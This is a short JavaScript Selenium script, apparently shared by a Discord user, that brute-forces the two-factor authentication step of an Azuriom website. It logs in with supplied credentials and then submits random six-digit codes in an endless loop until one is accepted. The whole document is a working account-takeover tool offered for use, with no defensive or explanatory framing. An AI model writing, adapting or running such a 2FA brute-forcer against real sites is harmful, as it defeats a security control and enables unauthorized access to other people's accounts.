// Azuriom 2fa bruteforce V1.0.0
// by mrcyci6 on discord
const webdriver = require('selenium-webdriver');
const {By, until} = require('selenium-webdriver')

async function manipulerSiteWeb() {

    try {
        const driver = new webdriver.Builder()
            .forBrowser('chrome')
            .build();

        await driver.get('https://www.domain.fr/user/login');

        // CONNEXION
        const email = await driver.findElement(By.css('#email'));
        const password = await driver.findElement(By.css('#password'));

        email.sendKeys("email")
        password.sendKeys("masterpassword")
        await driver.sleep(3000)
        await driver.executeScript("var bouton = document.querySelector('button.btn-primary');bouton.click()")

        // 2FA
        await driver.sleep(2000)
        while(true) {
            await driver.executeScript("var number = Math.floor(Math.random() * 900000);if(!String(number).split('')[5] && String(number).split('')[4] && String(number).split('')[3] && String(number).split('')[2] && String(number).split('')[1] && String(number).split('')[0]) {number = '0' + String(number)} else if(!String(number).split('')[5] && !String(number).split('')[4] && String(number).split('')[3] && String(number).split('')[2] && String(number).split('')[1] && String(number).split('')[0]) {number = '00' + String(number)} else if(!String(number).split('')[5] && !String(number).split('')[4] && !String(number).split('')[3] && String(number).split('')[2] && String(number).split('')[1] && String(number).split('')[0]) {number = '000' + String(number)} else if(!String(number).split('')[5] && !String(number).split('')[4] && !String(number).split('')[3] && !String(number).split('')[2] && String(number).split('')[1] && String(number).split('')[0]) {number = '0000' + String(number)} else if(!String(number).split('')[5] && !String(number).split('')[4] && !String(number).split('')[3] && !String(number).split('')[2] && !String(number).split('')[1] && String(number).split('')[0]) { number = '00000' + String(number)}document.getElementById('code').value = String(number);document.querySelector('button.btn-primary').click()")
        }

    } catch(e) {
        console.log(e)
    }
}

manipulerSiteWeb();